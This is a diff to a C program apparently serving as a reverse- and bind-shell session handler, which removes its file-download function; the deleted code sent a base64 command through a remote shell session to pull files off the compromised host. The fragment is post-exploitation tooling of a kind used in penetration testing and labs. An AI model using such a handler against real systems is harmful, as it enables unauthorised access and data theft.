@@ -10,7 +10,7 @@
  *  - Listen for reverse shells
  *  - Connect to bind shells
  *  - Manage multiple sessions (list, kill, use, background, etc)
- *  - Upload and download files via base64
+ *  - Upload files via base64
  *  - Upgrade remote shells to interactive PTYs
  *
  * Compile: gcc -o tusm main.c
@@ -430,21 +430,7 @@
   * @param local_name Suggested filename to use when decoding locally.
   */
  void download_file(int id, const char *remote_path, const char *local_name) {
-     if (id <= 0 || id > session_count) {
-         printf("[!] Invalid session ID\n");
-         return;
-     }
- 
-     char command[BUFFER_SIZE];
-     
-     printf("[*] Starting download of %s...\n", remote_path);
-     
-     // Send command to base64 encode the remote file
-     snprintf(command, sizeof(command), "base64 '%s' 2>/dev/null || echo 'FILE_NOT_FOUND'\n", remote_path);
-     write(sessions[id - 1].in_pipe[1], command, strlen(command));
-     
-     printf("[*] Download command sent. Check session output for base64 data.\n");
-     printf("[*] You can manually decode with: base64 -d > %s\n", local_name);
+   
  }
  
   /* ================== AUTO PTY SHELL ================== */
